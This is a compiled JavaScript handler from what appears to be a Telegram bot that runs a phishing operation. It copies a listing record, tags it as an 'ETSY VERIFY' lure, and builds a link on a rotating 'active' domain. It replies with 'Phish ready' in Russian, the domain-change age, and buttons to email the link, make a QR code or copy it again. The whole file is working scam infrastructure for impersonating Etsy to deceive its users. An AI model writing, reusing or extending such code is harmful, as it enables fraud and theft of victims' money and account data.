"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.composer = void 0;
const grammy_1 = require("grammy");
const database_1 = require("../../../database");
const getFlagEmoji_1 = require("../../../helpers/getFlagEmoji");
const ads_1 = require("../../../database/models/ads");
const getPictureMenu_1 = require("../../../helpers/getPictureMenu");
const moment_1 = __importDefault(require("moment"));
exports.composer = new grammy_1.Composer();
exports.composer.callbackQuery(/^etsy verify copy (?<id>\d+)$/, handler);
async function handler(ctx) {
    const mainAd = await database_1.adsRepository.findOne({
        relations: { author: true },
        where: {
            id: Number(ctx.match[1])
        },
    });
    if (!mainAd)
        return ctx.reply('ad undefined');
    const domen = await database_1.domensRepository.findOneBy({ active: true, service: `etsy` });
    const date = Date.now();
    const ad = new ads_1.Ads();
    ad.price = mainAd.price;
    ad.title = mainAd.title;
    ad.description = mainAd.description;
    ad.img = mainAd.img;
    ad.link = `2333383018-${date}`;
    ad.originallink = 'none';
    ad.deliveryPrice = "null";
    ad.date = `${date}`;
    ad.underService = 'verify';
    ad.country = mainAd.country;
    ad.service = 'etsy';
    ad.author = ctx.user;
    ad.manualCreation = true;
    await database_1.adsRepository.save(ad);
    return ctx.replyWithPhoto(await (0, getPictureMenu_1.getPictureMenu)(ctx.user), {
        caption: `
Фиш готов 👌

🆔 ID: <code>${ad.date}</code>

📦 <b>Магазин:</b> <code>${ad.title}</code>
💡 <b>Платформа: ETSY VERIFY [${ctx.session.country.toUpperCase()} ${(0, getFlagEmoji_1.getFlagEmoji)(ctx.session.country)}]</b>
♻️ <b>Домен сменён ${(0, moment_1.default)(new Date(domen.dateChange)).fromNow()}</b>
➖➖➖➖➖➖➖
🌠 <b>Созданные ссылки:</b> <a href="https://${domen.link}/link/${ad.link}">LINK [2.0]</a>
➖➖➖➖➖➖➖
<code>https://${domen.link}/link/${ad.link}</code>
`.replace('\n', ''),
        reply_markup: await createKeyboard(ad.id, ctx.user)
    });
}
const createKeyboard = async (id, user) => {
    const keyb = new grammy_1.InlineKeyboard();
    // .text("🙊 Настройки", `settings ad ${id}`)
    keyb.row();
    keyb.text("💌 EMAIL", `email ad ${id}`);
    keyb.text("🎲 QR-code", `qrcode get ${id}`);
    keyb.row();
    keyb.text("🖇 Создать копию", `etsy verify copy ${id}`);
    keyb.row();
    keyb.text("Главное меню", `menuWithPicture`);
    return keyb;
};
